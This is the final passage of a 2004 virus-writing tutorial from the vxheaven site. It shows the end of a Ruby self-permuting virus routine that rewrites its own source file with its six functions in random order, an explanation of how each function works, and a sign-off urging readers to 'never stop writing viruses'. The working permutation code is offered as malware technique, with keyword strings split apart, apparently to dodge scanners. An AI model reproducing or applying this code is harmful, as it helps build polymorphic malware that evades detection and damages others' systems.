&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">3</span><span style="color: black;">&#93;</span>==<span style="color:#996600;">&quot;d&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;ef&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; vf=st3<span style="color: black;">&#40;</span>code,i,vf,fc<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; fc<span style="color:#006600; font-weight:bold;">-</span>=<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; st6<span style="color: black;">&#40;</span>vf<span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
<br/>
<span style="color:#9966CC; font-weight:bold;">def</span> st3<span style="color: black;">&#40;</span>code,i,vf,fc<span style="color: black;">&#41;</span><br/>
&nbsp; j=<span style="color:#006666;">1</span><br/>
&nbsp; iold=i<br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> j<span style="color:#006600; font-weight:bold;">&gt;</span><span style="color:#006666;">0</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">3</span><span style="color: black;">&#93;</span>==<span style="color:#996600;">&quot;e&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;nd&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; j=st4<span style="color: black;">&#40;</span>j<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">5</span><span style="color: black;">&#93;</span>==<span style="color:#996600;">&quot;w&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;hile&quot;</span> <span style="color:#9966CC; font-weight:bold;">or</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">3</span><span style="color: black;">&#93;</span>==<span style="color:#996600;">&quot;i&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;f &quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; j=st5<span style="color: black;">&#40;</span>j<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; vf<span style="color: black;">&#91;</span>fc<span style="color: black;">&#93;</span>=code<span style="color: black;">&#91;</span>iold, i<span style="color:#006600; font-weight:bold;">-</span>iold<span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">3</span><span style="color: black;">&#93;</span><br/>
&nbsp; <span style="color:#0000FF; font-weight:bold;">return</span> vf<br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
<span style="color:#9966CC; font-weight:bold;">def</span> st4<span style="color: black;">&#40;</span>j<span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color:#0000FF; font-weight:bold;">return</span><span style="color: black;">&#40;</span>j<span style="color:#006600; font-weight:bold;">-</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
<br/>
<span style="color:#9966CC; font-weight:bold;">def</span> st5<span style="color: black;">&#40;</span>j<span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color:#0000FF; font-weight:bold;">return</span><span style="color: black;">&#40;</span>j<span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
<span style="color:#9966CC; font-weight:bold;">def</span> st6<span style="color: black;">&#40;</span>vf<span style="color: black;">&#41;</span><br/>
&nbsp; mf=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span>,<span style="color:#996600;">&quot;w&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; fc=<span style="color:#006666;">0</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> fc<span style="color:#006600; font-weight:bold;">&lt;</span><span style="color:#006666;">6</span><br/>
&nbsp; &nbsp; a=<span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">6</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> vf<span style="color: black;">&#91;</span>a<span style="color: black;">&#93;</span>!=<span style="color:#996600;">&quot;&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; mf.<span style="color:#9900CC;">write</span><span style="color: black;">&#40;</span>vf<span style="color: black;">&#91;</span>a<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; vf<span style="color: black;">&#91;</span>a<span style="color: black;">&#93;</span>=<span style="color:#996600;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; fc<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; mf.<span style="color:#9900CC;">write</span><span style="color: black;">&#40;</span><span style="color:#996600;">&quot;<span style="color:#000099;">\n</span>start()&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; mf.<span style="color:#9900CC;">close</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
start<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>The code you are looking at has 6 function, which changes their order at every execution The following code has 720 mutations: 6! = 6*5*4*3*2*1. A very important thing when writing a permutation virus with functions is, that you must give each funtion every variable-value it needs, because all variables are defined inside the function, and not global. Now read on how the thing works:</p>
<ul>
<li>First, 'start()' calls the first function.</li>
<li>In the function 'start()' the content of the current file will be read, and then it calls the next function, 'st2'.</li>
<li>'st2' is somehow the main function. First it searchs a 'def', and if the 'def' is founden, it calls 'st3'.</li>
<li>'st3' searchs the whole code of the function. If a 'if' or a 'while' is founden, a counter increases (because these commands also ends with an 'end') by 'st5'. If an 'end' is founden, the counter decreases by 'st4'. In the end the function writes the whole code of the founden function to vh[n] and returns that variable to 'st2'.</li>
<li>If every function is founden, 'st2' calls 'st6' for writing the whole function in a random order to the __FILE__.</li>
</ul>
<h2>4) Last Words</h2>
<p>In the end I have to say that Ruby is a quiet nice language, especially for viruses. Many technique are able to bring them to reality, even if some important commands, which are available in other languages, are missing. I hope that this tutorial helps you, firstly learning a maybe new language and secondly learning how to write a virus for it.</p>
<p>An article normally should end with greets, but I'm too lazy for that and I'm scared of forgetting anybody, so my greets goes to everybody. Especially to my home-group rRlf (rrlf.host.sk) :) Now, a thank you to you, reader, for still reading the maybe most uninteresting part of the article :) I hope you have liked it, and I would be very happy if you could send me your opinion, maybe bug (I dont think so) or suggestions! One important part in the end: Never stopp writing viruses, don't let virus writing dying! OK, see you out there soon...</p>
<pre>
                                                        - - - - - - - - - - - - - - -
                                                          Second Part To Hell/[rRlf]  
                                                          www.spth.de.vu
                                                          <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="621112160a2212100b0711164c010d0f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
                                                          written from oct-november 2004
                                                          Austria
                                                        - - - - - - - - - - - - - - - </pre>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp20">Back to index</a>] [<a href="/lib/vsp20.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp20">de</a><a href="/lib/index.php?lang=en&amp;id=vsp20">en</a><a href="/lib/index.php?lang=es&amp;id=vsp20">es</a><a href="/lib/index.php?lang=it&amp;id=vsp20">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp20">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp20">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp20">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp20">ua</a></div>
</body>
</html>
